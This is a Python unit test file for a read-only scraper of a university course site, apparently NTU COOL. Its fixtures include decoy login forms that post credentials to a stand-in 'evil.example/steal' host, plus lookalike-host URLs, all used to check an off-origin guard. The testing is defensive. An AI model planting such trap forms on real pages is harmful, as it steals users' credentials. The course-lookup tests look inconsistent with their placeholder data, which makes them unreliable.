"""Offline tests for ntu_fetch. No network, no credentials, no login.

Run:  python3 -m unittest discover -s tests -v
     or: python3 tests/test_ntu_fetch.py

These cover the parts that broke repeatedly while building the tool: the JSON
prefix handling, form extraction without BeautifulSoup, and the credential-file
permission guard. Everything here runs in milliseconds and can never touch
cool.ntu.edu.tw.
"""

import json
import os
import stat
import sys
import tempfile
import unittest

sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "scripts"))

import ntu_fetch  # noqa: E402


class TestParseJsonLoose(unittest.TestCase):
    """The upstream `json.loads(r.text[9:])` had no documented reason for 9.
    Our parser anchors on the first `{` or `[`, so a prefix may exist or not."""

    def test_bare_object(self):
        self.assertEqual(ntu_fetch.parse_json_loose('{"a": 1}'), {"a": 1})

    def test_bare_array(self):
        self.assertEqual(ntu_fetch.parse_json_loose('[1, 2]'), [1, 2])

    def test_prefix_before_object(self):
        self.assertEqual(ntu_fetch.parse_json_loose('while(1);{"a": 1}'), {"a": 1})

    def test_prefix_of_length_nine(self):
        # The exact case the upstream slice handled and nothing else did.
        self.assertEqual(ntu_fetch.parse_json_loose('someprexx{"a": 1}'), {"a": 1})

    def test_auth_failure_body(self):
        body = '{"status":"unauthenticated","errors":[{"message":"需要使用者授權"}]}'
        self.assertEqual(ntu_fetch.parse_json_loose(body)["status"], "unauthenticated")

    def test_garbage_raises(self):
        with self.assertRaises((ValueError, TypeError, KeyError)):
            ntu_fetch.parse_json_loose("not json at all")

    def test_empty_raises(self):
        with self.assertRaises((ValueError, TypeError, KeyError)):
            ntu_fetch.parse_json_loose("")

    def test_round_trip_nested(self):
        obj = {"courses": [{"id": 1, "name": "x", "term": None}]}
        self.assertEqual(ntu_fetch.parse_json_loose(")]}'\n" + json.dumps(obj)), obj)


class TestStripHtml(unittest.TestCase):
    """The two things BeautifulSoup was used for: flatten visible text,
    and find a form and read its inputs."""

    def test_flattens_paragraphs(self):
        self.assertIn("截止 10/20", ntu_fetch.strip_html("<p>截止 10/20 23:59</p>"))

    def test_drops_script_and_style(self):
        out = ntu_fetch.strip_html("<p>keep</p><script>var x=1;</script><style>p{}</style>")
        self.assertIn("keep", out)
        self.assertNotIn("var x", out)
        self.assertNotIn("p{}", out)

    def test_unescapes_entities(self):
        self.assertIn("a & b", ntu_fetch.strip_html("<p>a &amp; b</p>"))

    def test_empty_returns_empty(self):
        self.assertEqual(ntu_fetch.strip_html("").strip(), "")


class TestParseFirstForm(unittest.TestCase):
    """parse_first_form returns the FIRST form in document order.

    That is deliberate and it is NOT the security boundary — a login page can
    park a trap form early in <head>, and this function will hand it back. The
    credential protection lives in _abs_action, tested separately below. Do not
    'fix' this by making parse_first_form pick a form: it has no idea what the
    legitimate origin is."""

    FORM = """
    <html><head><form action="https://evil.example/steal" method="post">
      <input name="username" value="trap"></form></head>
    <body><form action="/login/saml" method="post">
      <input name="username" value=""><input name="password" value="">
    </form></body></html>"""

    def test_returns_a_form(self):
        self.assertIsNotNone(ntu_fetch.parse_first_form(self.FORM))

    def test_it_picks_first_in_document_order(self):
        # Documenting current behaviour, including that it can be the decoy.
        form = ntu_fetch.parse_first_form(self.FORM)
        self.assertEqual(form.action, "https://evil.example/steal")

    def test_no_form_yields_empty_object_not_an_error(self):
        # The caller raises on a missing action, not this parser.
        form = ntu_fetch.parse_first_form("<html><body>no form here</body></html>")
        self.assertIsNone(form.action)
        self.assertEqual(form.inputs, {})

    def test_collects_inputs_of_the_first_form_only(self):
        form = ntu_fetch.parse_first_form(self.FORM)
        self.assertEqual(form.inputs, {"username": "trap"})


class TestCredentialFilePermissions(unittest.TestCase):
    """A group- or world-readable credential file must be refused."""

    def setUp(self):
        self.dir = tempfile.mkdtemp()
        self.path = os.path.join(self.dir, "creds.json")
        with open(self.path, "w") as f:
            f.write(json.dumps({"ntu_user": "x", "ntu_pass": "x"}))

    def tearDown(self):
        os.chmod(self.path, stat.S_IRUSR | stat.S_IWUSR)
        os.remove(self.path)
        os.rmdir(self.dir)

    def test_private_file_accepted(self):
        os.chmod(self.path, stat.S_IRUSR | stat.S_IWUSR)  # 600
        # Should not raise.
        ntu_fetch._assert_private_cred_file(self.path)

    def test_group_readable_refused(self):
        os.chmod(self.path, stat.S_IRUSR | stat.S_IWUSR | stat.S_IRGRP)  # 640
        with self.assertRaises(Exception):
            ntu_fetch._assert_private_cred_file(self.path)

    def test_world_readable_refused(self):
        os.chmod(self.path, 0o644)
        with self.assertRaises(Exception):
            ntu_fetch._assert_private_cred_file(self.path)


class TestFindCourse(unittest.TestCase):
    COURSES = [
        {"id": 1, "name": "<course name>"},
        {"id": 2, "name": "<course name>"},
        {"id": 3, "name": None},
    ]

    def test_match_by_id(self):
        self.assertEqual(ntu_fetch.find_course(self.COURSES, "2")["id"], 2)

    def test_match_by_name_substring(self):
        self.assertEqual(ntu_fetch.find_course(self.COURSES, "fluid")["id"], 2)

    def test_case_insensitive(self):
        self.assertEqual(ntu_fetch.find_course(self.COURSES, "MATHEMATICS")["id"], 1)

    def test_no_match_returns_none(self):
        self.assertIsNone(ntu_fetch.find_course(self.COURSES, "nonexistent"))


class TestNoWriteMethods(unittest.TestCase):
    """Read-only is a contract, not a convention. If a POST/PUT/PATCH/DELETE
    ever lands in the fetch layer, this test fails loudly."""

    def test_fetch_layer_has_no_write_verbs(self):
        import re

        src = open(ntu_fetch.__file__ or "", encoding="utf-8").read()
        # Everything after the login function is the fetch layer.
        fetch_layer = src.split("def fetch_courses", 1)[1]
        offenders = re.findall(r"\.(post|put|patch|delete|request)\(", fetch_layer)
        self.assertEqual(
            offenders,
            [],
            f"write verbs in fetch layer: {offenders}",
        )




class TestAbsActionRefusesOffOrigin(unittest.TestCase):
    """THE credential safety boundary.

    A trap form in <head> is picked up by parse_first_form. It must never
    become a POST target. _abs_action resolves the action against the hop's own
    base and rejects a different origin, so the worst case is a named error —
    not a credential sent somewhere unexpected."""

    BASE = "https://adfs.ntu.edu.tw/"

    def _form(self, action):
        class F:
            pass
        f = F()
        f.action = action
        f.inputs = {}
        return f

    def test_off_origin_action_is_refused(self):
        with self.assertRaises(Exception) as ctx:
            ntu_fetch._abs_action(self._form("https://evil.example/steal"), self.BASE)
        self.assertIn("off-origin", str(ctx.exception))

    def test_protocol_relative_off_origin_is_refused(self):
        with self.assertRaises(Exception):
            ntu_fetch._abs_action(self._form("//evil.example/x"), self.BASE)

    def test_lookalike_host_is_refused(self):
        with self.assertRaises(Exception):
            ntu_fetch._abs_action(self._form("https://adfs.ntu.edu.tw.evil.example/x"),
                                 self.BASE)

    def test_same_origin_relative_is_accepted(self):
        self.assertEqual(
            ntu_fetch._abs_action(self._form("/auth"), self.BASE),
            "https://adfs.ntu.edu.tw/auth",
        )

    def test_same_origin_absolute_is_accepted(self):
        self.assertEqual(
            ntu_fetch._abs_action(self._form("https://adfs.ntu.edu.tw/auth"), self.BASE),
            "https://adfs.ntu.edu.tw/auth",
        )

    def test_missing_action_is_a_hard_error(self):
        with self.assertRaises(Exception):
            ntu_fetch._abs_action(self._form(None), self.BASE)

    def test_full_trap_path_cannot_post_off_origin(self):
        """End to end through the real parser: trap form in <head>, real form
        in <body>. The parser hands back the trap; the guard must stop it."""
        page = (
            '<html><head><form action="https://evil.example/steal" method="post">'
            '<input name="username"></form></head>'
            '<body><form action="/auth" method="post"><input name="password"></form>'
            '</body></html>'
        )
        form = ntu_fetch.parse_first_form(page)
        self.assertEqual(form.action, "https://evil.example/steal")  # trap is first
        with self.assertRaises(Exception) as ctx:
            ntu_fetch._abs_action(form, self.BASE)
        self.assertIn("off-origin", str(ctx.exception))


if __name__ == "__main__":
    unittest.main(verbosity=2)
